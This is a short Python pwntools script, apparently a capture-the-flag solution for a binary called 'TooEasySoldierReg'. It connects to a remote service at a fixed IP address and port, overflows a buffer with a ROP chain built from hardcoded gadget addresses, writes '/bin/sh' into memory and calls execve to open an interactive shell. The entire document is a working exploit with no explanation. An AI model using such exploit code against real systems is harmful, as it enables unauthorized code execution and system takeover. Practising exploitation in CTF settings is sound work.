#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

#r = process('./TooEasySoldierReg')
r = remote('203.66.83.49', 6666)

# 0xc82003be60
fake_stack = 0xc82003be98
pop_rax_ret = 0x00000000004018da
pop_rdi_ret_0xf = 0x421a8d
pop_rsi_ret_0x560f = 0x42929f
pop_rdx_ret_0xff3 = 0x00000000004610f0
syscall = 0x00000000004567e9
pop_rsi_add_al_0x83_ret = 0x0000000000442a44

rop1 = flat(
    pop_rsi_add_al_0x83_ret, 0x590300, pop_rdi_ret_0xf, 0,
    pop_rax_ret, 'a'*0xf , 0, syscall
)

rop = flat(
    pop_rdx_ret_0xff3, 0, pop_rdi_ret_0xf, 'a'*0xff3 , 0x590300, 
    pop_rax_ret, 'a'*0xf, 0x3b, pop_rsi_add_al_0x83_ret, 0, pop_rax_ret, 0x3b, syscall
)


r.sendline('A'*240 + p64(0x590000) + p64(0x100) + 'bbbb'*58 + rop1 + rop)

raw_input('#')
r.send('/bin/sh\x00')

r.interactive()
